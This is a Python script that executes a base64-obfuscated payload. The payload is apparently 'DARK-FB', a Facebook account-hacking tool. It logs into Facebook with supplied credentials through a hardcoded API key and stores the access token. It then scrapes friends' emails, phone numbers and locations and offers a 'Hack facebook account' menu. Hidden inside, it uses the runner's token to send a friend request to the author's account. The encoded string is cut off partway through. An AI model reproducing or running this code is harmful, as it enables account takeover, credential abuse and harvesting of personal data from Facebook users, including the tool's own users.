#Compile By King Mr_Z17
#YouTube Mr_Z17
import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24KIyBjb2Rpbmc9dXRmLTgKIyBLaW5nIE1yX1oxNwojIFNvdXJjZSA6IFB5dGhvbjIgR2VyYWsiCiMgREFSSy1GQiB2ZXJzaW9uMi4yCgojSW1wb3J0IG1vZHVsZQppbXBvcnQgb3Msc3lzLHRpbWUsZGF0ZXRpbWUscmFuZG9tLGhhc2hsaWIscmUsdGhyZWFkaW5nLGpzb24sZ2V0cGFzcyx1cmxsaWIsY29va2llbGliCmZyb20gbXVsdGlwcm9jZXNzaW5nLnBvb2wgaW1wb3J0IFRocmVhZFBvb2wKdHJ5OgoJaW1wb3J0IG1lY2hhbml6ZQpleGNlcHQgSW1wb3J0RXJyb3I6Cglvcy5zeXN0ZW0oInBpcDIgaW5zdGFsbCBtZWNoYW5pemUiKQp0cnk6CglpbXBvcnQgcmVxdWVzdHMKZXhjZXB0IEltcG9ydEVycm9yOgoJb3Muc3lzdGVtKCJwaXAyIGluc3RhbGwgcmVxdWVzdHMiKQpmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcgpmcm9tIG1lY2hhbml6ZSBpbXBvcnQgQnJvd3NlcgoKIy1TZXR0aW5nLSMKIyMjIyMjIyMKcmVsb2FkKHN5cykKc3lzLnNldGRlZmF1bHRlbmNvZGluZygndXRmOCcpCmJyID0gbWVjaGFuaXplLkJyb3dzZXIoKQpici5zZXRfaGFuZGxlX3JvYm90cyhGYWxzZSkKYnIuc2V0X2hhbmRsZV9yZWZyZXNoKG1lY2hhbml6ZS5faHR0cC5IVFRQUmVmcmVzaFByb2Nlc3NvcigpLG1heF90aW1lPTEpCmJyLmFkZGhlYWRlcnMgPSBbKCdVc2VyLUFnZW50JywnT3BlcmEvOS44MCAoQW5kcm9pZDsgT3BlcmEgTWluaS8zMi4wLjIyNTQvODUuIFU7IGlkKSBQcmVzdG8vMi4xMi40MjMgVmVyc2lvbi8xMi4xNicpXQoKIy1LZWx1YXItIwpkZWYga2VsdWFyKCk6CglwcmludCAiXDAzM1sxOzkxbVshXSBFeGl0IgoJb3Muc3lzLmV4aXQoKQoJCiMtV2FybmEtIwpkZWYgYWNhayh4KToKICAgIHcgPSAnbWhrYnBjUCcKICAgIGQgPSAnJwogICAgZm9yIGkgaW4geDoKICAgICAgICBkICs9ICchJyt3W3JhbmRvbS5yYW5kaW50KDAsbGVuKHcpLTEpXStpCiAgICByZXR1cm4gY2V0YWsoZCkKICAgIApkZWYgY2V0YWsoeCk6CiAgICB3ID0gJ21oa2JwY1AnCiAgICBmb3IgaSBpbiB3OgogICAgICAgIGogPSB3LmluZGV4KGkpCiAgICAgICAgeD0geC5yZXBsYWNlKCchJXMnJWksJ1wwMzNbJXM7MW0nJXN0cigzMStqKSkKICAgIHggKz0gJ1wwMzNbMG0nCiAgICB4ID0geC5yZXBsYWNlKCchMCcsJ1wwMzNbMG0nKQogICAgc3lzLnN0ZG91dC53cml0ZSh4KydcbicpCgkKIy1BbmltYXNpLSMKZGVmIGphbGFuKHopOgoJZm9yIGUgaW4geiArICdcbic6CgkJc3lzLnN0ZG91dC53cml0ZShlKQoJCXN5cy5zdGRvdXQuZmx1c2goKQoJCXRpbWUuc2xlZXAoMTApCgkJCiMjIyNMT0dPIyMjIwpsb2dvID0iIiIgXDAzM1sxOzkybQrilpPilojilojilojilojilojiloQgIOKWhOKWhOKWhCAgICAgICDilojilojiloDilojilojiloggICDilojilogg4paE4paI4paAICDilojilojilojilojilojilpLiloTiloTiloTiloQgICAK4paS4paI4paI4paAIOKWiOKWiOKWjOKWkuKWiOKWiOKWiOKWiOKWhCAgICDilpPilojilogg4paSIOKWiOKWiOKWkiDilojilojiloTilojilpIg4paT4paI4paIICAg4paS4paT4paI4paI4paI4paI4paI4paEIArilpHilojiloggICDilojilozilpLilojiloggIOKWgOKWiOKWhCAg4paT4paI4paIIOKWkeKWhOKWiCDilpLilpPilojilojilojiloTilpEg4paS4paI4paI4paI4paIIOKWkeKWkuKWiOKWiOKWkiDiloTilojilogK4paR4paT4paI4paEICAg4paM4paR4paI4paI4paE4paE4paE4paE4paI4paIIOKWkuKWiOKWiOKWgOKWgOKWiOKWhCAg4paT4paI4paIIOKWiOKWhCDilpHilpPilojilpIgIOKWkeKWkuKWiOKWiOKWkeKWiOKWgCAgCuKWkeKWkuKWiOKWiOKWiOKWiOKWkyAg4paT4paIICAg4paT4paI4paI4paS4paR4paI4paI4paTIOKWkuKWiOKWiOKWkuKWkuKWiOKWiOKWkiDilojiloTilpHilpLilojilpEgICDilpHilpPiloggIOKWgOKWiOKWkwog4paS4paS4paTICDilpIgIOKWkuKWkiAgIOKWk+KWkuKWiOKWkeKWkSDilpLilpMg4paR4paS4paT4paR4paSIOKWkuKWkiDilpPilpIg4paSIOKWkSAgIOKWkeKWkuKWk+KWiOKWiOKWiOKWgOKWkgog4paRIOKWkiAg4paSICAg4paSICAg4paS4paSIOKWkSAg4paR4paSIOKWkSDilpLilpHilpEg4paR4paSIOKWkuKWkSDilpEgICAgIOKWkuKWkeKWkiAgIOKWkSAKIOKWkSDilpEgIOKWkSAgIOKWkSAgIOKWkiAgICAg4paR4paRICAg4paRIOKWkSDilpHilpEg4paRICDilpEg4paRICAgIOKWkSAgICDilpEgCiAgIOKWkSAgICAgICAgICDilpEgIOKWkSAgIOKWkSAgICAg4paRICDilpEgICAgICAgICAgIOKWkSAgICAgIAog4paRICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4paRIAoKXDAzM1sxOzk3beKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlwpcMDMzWzE7OTdt4pWRXDAzM1sxOzkzbcKkIFwwMzNbMTs5N21BdXRob3IgIFwwMzNbMTs5Mm06IFwwMzNbMTs5N21LaW5nIE1yX1oxNy4gICAgIFwwMzNbMTs5N20gICAgICAgICAgICAgIOKVkQpcMDMzWzE7OTdt4pWRXDAzM1sxOzkzbcKkIFwwMzNbMTs5MW1Zb3VUdWJlIFwwMzNbMTs5Mm06IFwwMzNbMTs5N21cMDMzWzRtTXJfWjE3XDAzM1swbSBcMDMzWzE7OTdtICAgICAgICAgICAgICAgICAgICAgICAg4pWRClwwMzNbMTs5N23ilZFcMDMzWzE7OTNtwqQgXDAzM1sxOzk0bUdpdGh1YiAgXDAzM1sxOzkybTogXDAzM1sxOzk3bVwwMzNbNG1odHRwczovL2dpdGh1Yi5jb20vS2luZ01yWjE3XDAzM1swbSBcMDMzWzE7OTdtICDilZEKXDAzM1sxOzk3beKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnQoiIiIKCiMgdGl0aWsgIwpkZWYgdGlrKCk6Cgl0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4uLi4gJ10KCWZvciBvIGluIHRpdGlrOgoJCXByaW50KCJcclwwMzNbMTs5MW1b4pePXSBcMDMzWzE7OTJtVHVuZ2d1IHNlYmVudGFyIFwwMzNbMTs5N20iK28pLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgxKQoKYmFjayA9IDAKdGhyZWFkcyA9IFtdCmJlcmhhc2lsID0gW10KY2VrcG9pbnQgPSBbXQpva3MgPSBbXQpnYWdhbCA9IFtdCmlkdGVtYW4gPSBbXQppZGZyb210ZW1hbiA9IFtdCmlkbWVtID0gW10KZW1tZW0gPSBbXQpub21lbSA9IFtdCmlkID0gW10KZW0gPSBbXQplbWZyb210ZW1hbiA9IFtdCmhwID0gW10KaHBmcm9tdGVtYW4gPSBbXQpyZWFrc2kgPSBbXQpyZWFrc2lncnVwID0gW10Ka29tZW4gPSBbXQprb21lbmdydXAgPSBbXQpsaXN0Z3J1cCA9IFtdCnZ1bG5vdCA9ICJcMDMzWzMxbU5vdCBWdWxuIgp2dWxuID0gIlwwMzNbMzJtVnVsbiIKbmFtZSA9ICdCRVJLQUgnCnBhd3MgPSAnUkFNQURIQU4nCgpkZWYgYW4oKToKICAgIG9zLnN5c3RlbSgncmVzZXQnKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbWV3LnR4dCcsICdyJykucmVhZCgpCiAgICAgICAgbWVudSgpCiAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToKICAgICAgICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgIHByaW50ICdcMDMzWzE7OTdtW1wwMzNbMTs5Mm3inJNcMDMzWzE7OTdtXSBcMDMzWzE7OTdtU2lsYWhrYW5rYW4ga3VuanVuZ2kgXDAzM1sxOzk1bUlOU1RBR1JBTSBcMDMzWzE7OTdtQXV0aG9yIHVudHVrIE1lbmRhcGF0a2FuIFVzZXIgJiBQYXNzIFRvb2xzIGluaS4uJwogICAgICAgIHRpbWUuc2xlZXAoNSkKICAgICAgICBwcmludCAnXDAzM1sxOzk3bVtcMDMzWzE7OTJt4pyTXDAzM1sxOzk3bV0gXDAzM1sxOzk3bVNpbGFoa2FuIENhcmkgVXNlciAmIFBhc3MgbnlhIGRpIFBvc3RpbmdhbiBcMDMzWzE7OTVtSU5TVEFHUkFNIFwwMzNbMTs5N21BdXRob3IuLicKICAgICAgICB0aW1lLnNsZWVwKDUpCiAgICAgICAgcHJpbnQgJ1wwMzNbMTs5N21bXDAzM1sxOzkybeKck1wwMzNbMTs5N21dIFwwMzNbMTs5N21Ba3VuIFwwMzNbMTs5NW1JTlNUQUdSQU0gXDAzM1sxOzk3bUF1dGhvciBCZXJzaWZhdCBQcml2YXRlLEphZGkgRWx1IEhhcnVzIEZPTExPVyBBa3VubnlhIFRlcmxlYmloIERhaHVsdS4uJwogICAgICAgIHRpbWUuc2xlZXAoNSkKICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vaW5zdGFncmFtLmNvbS96aWRhbl9pZDE3P2lnc2hpZD0xaXJ6cWI0c2pzMzczJykKICAgICAgICBwcmludCAnXDAzM1sxOzkzbVtcMDMzWzE7OTFtIVwwMzNbMTs5M21dIFwwMzNbMTs5MG1KSUtBIFNVREFIIE1FTkRBUEFUS0FOIFVTRVIgJiBQQVNTIG55YSBTSUxBSEtBTiBMT0dJTi4uLiAnCiAgICAgICAgdGltZS5zbGVlcCg3KQogICAgICAgIHByaW50ICdcMDMzWzE7OTNtW+KYhV0gXDAzM1sxOzkybUxPR0lOIERBUktGQiBUT09MUyBcMDMzWzE7OTNtW+KYhV0nCiAgICAgICAgdW5hbWUgPSByYXdfaW5wdXQoJ1xuXHgxYlszMjsxbVtceDFiWzMzOzFtI1x4MWJbMzI7MW1dXHgxYlszNzsxbSBVU0VSTkFNRSA6ICcpCiAgICAgICAgaWYgdW5hbWUgPT0gbmFtZToKICAgICAgICAgICAgcHdkID0gcmF3X2lucHV0KCdceDFiWzMyOzFtW1x4MWJbMzM7MW0jXHgxYlszMjsxbV1ceDFiWzM3OzFtIFBBU1NXT1JEIDogJykKICAgICAgICAgICAgaWYgcHdkID09IHBhd3M6CiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlszMjsxbVtceDFiWzMyOzFtK1x4MWJbMzI7MW1dXHgxYlszNzsxbSBMb2dpbiBCZXJoYXNpbCcKICAgICAgICAgICAgICAgIGNlayA9IHJhd19pbnB1dCgnXHgxYlszMjsxbVtceDFiWzMxOzFtK1x4MWJbMzI7MW1dXHgxYlszNzsxbSBUZWthbiBFbnRlciBVbnR1ayBNZWxhbmp1dGthbiAnKQogICAgICAgICAgICAgICAgbG9naW4oKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMzI7MW1bXHgxYlszMTsxbS1ceDFiWzMyOzFtXVx4MWJbMzc7MW0gUGFzc3dvcmQgXHgxYlszMTsxbWxpY2Vuc2kgYW5kYSBzYWxhaCBLT05UT0wnCiAgICAgICAgICAgICAgICByYXdfaW5wdXQoJ1x4MWJbMzI7MW1bXHgxYlszMTsxbStceDFiWzMyOzFtXVx4MWJbMzc7MW0gU2lsYWhrYW4gQ29iYSBMYWdpIE5hbnRpICcpCiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICAgICAgICAgICAgICAgIGFuKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCAnXHgxYlszMjsxbVtceDFiWzMxOzFtLVx4MWJbMzI7MW1dXHgxYlszNzsxbSBVc2VybmFtZSBceDFiWzMxOzFtU2FsYWggTUVNRUsnCiAgICAgICAgICAgIHJhd19pbnB1dCgnXHgxYlszMjsxbVtceDFiWzMxOzFtK1x4MWJbMzI7MW1dXHgxYlszNzsxbSBTaWxhaGthbiBDb2JhIExhZ2kgTmFudGkgICcpCiAgICAgICAgICAgIGFuKCkKCiMjIyMjIFBpbGloIExvZ2luICMjIyMjCmRlZiBtYXN1aygpOgoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTEuXDAzM1sxOzkybSBMb2dpbiIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMi5cMDMzWzE7OTNtIExvZ2luIHVzaW5nIHRva2VuIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5MW0gRXhpdCIKCXByaW50ICJcMDMzWzE7OTdt4pWRIgoJbXN1ayA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1EIFwwMzNbMTs5N20iKQoJaWYgbXN1ayA9PSIiOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJa2VsdWFyKCkKCWVsaWYgbXN1ayA9PSIxIjoKCQlsb2dpbigpCgllbGlmIG1zdWsgPT0iMiI6CgkJdG9rZW56KCkKCWVsaWYgbXN1ayA9PSIwIjoKCQlrZWx1YXIoKQoJZWxzZToKCQlwcmludCJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCWtlbHVhcigpCgkJCiMjIyMjIExPR0lOICMjIyMjCiM9PT09PT09PT09PT09PT09IwpkZWYgbG9naW4oKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0ID0gb3BlbignbG9naW4udHh0JywncicpCgkJbWVudSgpIAoJZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToKCQlvcy5zeXN0ZW0oJ3Jlc2V0JykKCQlwcmludCBsb2dvCgkJcHJpbnQgJ1wwMzNbMTs5N21bXDAzM1sxOzkxbSFcMDMzWzE7OTdtXSBTSUxBSEtBTiBMT0dJTiBNRUxBTFVJIEJST1dTRVIgJwoJCWlkID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTszMm1JRFwwMzNbMTs5N218XDAzM1sxOzkybUVtYWlsXDAzM1sxOzk3bSBcMDMzWzE7OTFtOlwwMzNbMTs5M20gJykKCQlwd2QgPSBnZXRwYXNzLmdldHBhc3MoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzMybVBhc3N3b3JkIFwwMzNbMTs5MW06XDAzM1sxOzk2bSAnKQoJCXRpaygpCgkJdHJ5OgoJCQlici5vcGVuKCdodHRwczovL20uZmFjZWJvb2suY29tJykKCQlleGNlcHQgbWVjaGFuaXplLlVSTEVycm9yOgoJCQlwcmludCJcblwwMzNbMTs5MW1bIV0gTm8gY29ubmVjdGlvbiIKCQkJa2VsdWFyKCkKCQlici5fZmFjdG9yeS5pc19odG1sID0gVHJ1ZQoJCWJyLnNlbGVjdF9mb3JtKG5yPTApCgkJYnIuZm9ybVsnZW1haWwnXSA9IGlkCgkJYnIuZm9ybVsncGFzcyddID0gcHdkCgkJYnIuc3VibWl0KCkKCQl1cmwgPSBici5nZXR1cmwoKQoJCWlmICdzYXZlLWRldmljZScgaW4gdXJsOgoJCQl0cnk6CgkJCQlzaWc9ICdhcGlfa2V5PTg4MmE4NDkwMzYxZGE5ODcwMmJmOTdhMDIxZGRjMTRkY3JlZGVudGlhbHNfdHlwZT1wYXNzd29yZGVtYWlsPScraWQrJ2Zvcm1hdD1KU09OZ2VuZXJhdGVfbWFjaGluZV9pZD0xZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTFsb2NhbGU9ZW5fVVNtZXRob2Q9YXV0aC5sb2dpbnBhc3N3b3JkPScrcHdkKydyZXR1cm5fc3NsX3Jlc291cmNlcz0wdj0xLjA2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicKCQkJCWRhdGEgPSB7ImFwaV9rZXkiOiI4ODJhODQ5MDM2MWRhOTg3MDJiZjk3YTAyMWRkYzE0ZCIsImNyZWRlbnRpYWxzX3R5cGUiOiJwYXNzd29yZCIsImVtYWlsIjppZCwiZm9ybWF0IjoiSlNPTiIsICJnZW5lcmF0ZV9tYWNoaW5lX2lkIjoiMSIsImdlbmVyYXRlX3Nlc3Npb25fY29va2llcyI6IjEiLCJsb2NhbGUiOiJlbl9VUyIsIm1ldGhvZCI6ImF1dGgubG9naW4iLCJwYXNzd29yZCI6cHdkLCJyZXR1cm5fc3NsX3Jlc291cmNlcyI6IjAiLCJ2IjoiMS4wIn0KCQkJCXg9aGFzaGxpYi5uZXcoIm1kNSIpCgkJCQl4LnVwZGF0ZShzaWcpCgkJCQlhPXguaGV4ZGlnZXN0KCkKCQkJCWRhdGEudXBkYXRlKHsnc2lnJzphfSkKCQkJCXVybCA9ICJodHRwczovL2FwaS5mYWNlYm9vay5jb20vcmVzdHNlcnZlci5waHAiCgkJCQlyPXJlcXVlc3RzLmdldCh1cmwscGFyYW1zPWRhdGEpCgkJCQl6PWpzb24ubG9hZHMoci50ZXh0KQoJCQkJemVkZCA9IG9wZW4oImxvZ2luLnR4dCIsICd3JykKCQkJCXplZGQud3JpdGUoelsnYWNjZXNzX3Rva2VuJ10pCgkJCQl6ZWRkLmNsb3NlKCkKCQkJCXByaW50ICdcblwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Mb2dpbiBzdWNjZXNzZnVsbHknCgkJCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP21ldGhvZD1wb3N0JnVpZHM9Z3dpbXVzYTMmYWNjZXNzX3Rva2VuPScrelsnYWNjZXNzX3Rva2VuJ10pCgkJCQlvcy5zeXN0ZW0oJycpCgkJCQltZW51KCkKCQkJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCQkJcHJpbnQiXG5cMDMzWzE7OTFtWyFdIE5vIGNvbm5lY3Rpb24iCgkJCQlrZWx1YXIoKQoJCWlmICdjaGVja3BvaW50JyBpbiB1cmw6CgkJCXByaW50KCJcblwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIpCgkJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJCXRpbWUuc2xlZXAoMSkKCQkJa2VsdWFyKCkKCQllbHNlOgoJCQlwcmludCgiXG5cMDMzWzE7OTFtWyFdIExvZ2luIEZhaWxlZCIpCgkJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJCXRpbWUuc2xlZXAoMSkKCQkJbG9naW4oKQoJCQkKIyMjIyMgVE9LRU4gIyMjIyMKZGVmIHRva2VueigpOgoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCgl0b2tldCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtVG9rZW5cMDMzWzE7OTFtIDogXDAzM1sxOzk3bSIpCgl0cnk6CgkJb3R3ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlhID0ganNvbi5sb2FkcyhvdHcudGV4dCkKCQluYW1hID0gYVsnbmFtZSddCgkJemVkZCA9IG9wZW4oImxvZ2luLnR4dCIsICd3JykKCQl6ZWRkLndyaXRlKHRva2V0KQoJCXplZGQuY2xvc2UoKQoJCW1lbnUoKQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIgoJCWUgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bP10gXDAzM1sxOzkybVdhbnQgdG8gcGljayB1cCB0b2tlbj9cMDMzWzE7OTdtW3kvbl06ICIpCgkJaWYgZSA9PSIiOgoJCQlrZWx1YXIoKQoJCWVsaWYgZSA9PSJ5IjoKCQkJbG9naW4oKQoJCWVsc2U6CgkJCWtlbHVhcigpCgkJCQojIyMjIyBNRU5VICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpkZWYgbWVudSgpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJb3Muc3lzdGVtKCdyZXNldCcpCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJdHJ5OgoJCW90dyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPScrdG9rZXQpCgkJYSA9IGpzb24ubG9hZHMob3R3LnRleHQpCgkJbmFtYSA9IGFbJ25hbWUnXQoJCWlkID0gYVsnaWQnXQoJZXhjZXB0IEtleUVycm9yOgoJCW9zLnN5c3RlbSgncmVzZXQnKQoJCXByaW50IlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBObyBjb25uZWN0aW9uIgoJCWtlbHVhcigpCglvcy5zeXN0ZW0oInJlc2V0IikKCXByaW50IGxvZ28KCXByaW50ICLilZFcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXVwwMzNbMTs5N20gTmFtZSBcMDMzWzE7OTFtOiBcMDMzWzE7OTJtIituYW1hKyJcMDMzWzE7OTdtIgoJcHJpbnQgIlwwMzNbMTs5N23ilZoiKzQwKiLilZAiCglwcmludCAiMV0uIFVzZXIgaW5mb3JtYXRpb24iCglwcmludCAiMl0uIEhhY2sgZmFjZWJvb2sgYWNjb3VudCAgICAgICAgICAgICAgICIKCXByaW50ICIzXS4gU2hvdyB0b2tlbiAgICAgICAgICAgIgoJcHJpbnQgIjRdLiBMb2dPdXQgICAgICAgICAgICAiCglwcmludCAiNV0uIEV4aXQgdGhlIHByb2dyYW1zICAgICAgICAgICIKCXBpbGloKCkKIy0KZGVmIHBpbGloKCk6Cgl6ZWRkID0gcmF3X2lucHV0KCJcMDMzWzE7OTdt4pWa4pWQXDAzM1sxOzkxbUQgXDAzM1sxOzk3bSIpCglpZiB6ZWRkID09IiI6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJcGlsaWgoKQoJZWxpZiB6ZWRkID09IjEiOgoJCWluZm9ybWFzaSgpCgllbGlmIHplZGQgPT0iMiI6CgkJbWVudV9oYWNrKCkKCWVsaWYgemVkZCA9PSIzIjoKCQlvcy5zeXN0ZW0oJ3Jlc2V0JykKCQlwcmludCBsb2dvCgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Zb3VyIHRva2VuXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiK3Rva2V0CgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51KCkKCWVsaWYgemVkZCA9PSI0IjoKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCW9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ25JanVNRHZpRGtjWl9FWENfaU5oOGc/c3ViX2NvbmZpcm1hdGlvbj0xJykKCQlrZWx1YXIoKQoJZWxpZiB6ZWRkID09IjAiOgoJCWtlbHVhcigpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCXBpbGloKCkKCQojIyMjIyBJTkZPICMjIyMjCmRlZiBpbmZvcm1hc2koKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJYWlkID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1FbnRlciBJRFwwMzNbMTs5N20vXDAzM1sxOzkybU5hbWVcMDMzWzE7OTFtIDogXDAzM1sxOzk3bScpCglqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1XYWl0IGEgbWludXRlIFwwMzNbMTs5N20uLi4nKQoJciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCWNvayA9IGpzb24ubG9hZHMoci50ZXh0KQoJZm9yIGkgaW4gY29rWydkYXRhJ106CgkJaWYgYWlkIGluIGlbJ25hbWUnXSBvciBhaWQgaW4gaVsnaWQnXToKCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpWydpZCddKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJCXRyeToKCQkJCXByaW50ICdcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICAgICAgIDogJyt6WyduYW1lJ10KCQkJZXhjZXB0IEtleUVycm9yOiBwcmludCAnXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgICAgICAgOiBcMDMzWzE7OTFtTm90IGZvdW5kJwoJCQl0cnk6CgkJCQlwcmludCAnXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1JRFwwMzNbMTs5N20gICAgICAgICAgICA6ICcrelsnaWQnXQoJCQlleGNlcHQgS2V5RXJyb3I6IHByaW50ICdcMDMzWzE7OTFtWz9dIFwwMzNbMTs5Mm1JRFwwMzNbMTs5N20gICAgICAgICAgICA6IFwwMzNbMTs5MW1Ob3QgZm91bmQnCgkJCXRyeToKCQkJCXByaW50ICdcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybUVtYWlsXDAzM1sxOzk3bSAgICAgICAgIDogJyt6WydlbWFpbCddCgkJCWV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5MW1bP10gXDAzM1sxOzkybUVtYWlsXDAzM1sxOzk3bSAgICAgICAgIDogXDAzM1sxOzkxbU5vdCBmb3VuZCcKCQkJdHJ5OgoJCQkJcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVGVsZXBob25lXDAzM1sxOzk3bSAgICAgOiAnK3pbJ21vYmlsZV9waG9uZSddCgkJCWV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5MW1bP10gXDAzM1sxOzkybVRlbGVwaG9uZVwwMzNbMTs5N20gICAgIDogXDAzM1sxOzkxbU5vdCBmb3VuZCcKCQkJdHJ5OgoJCQkJcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtTG9jYXRpb25cMDMzWzE7OTdtICAgICAgOiAnK3pbJ2xv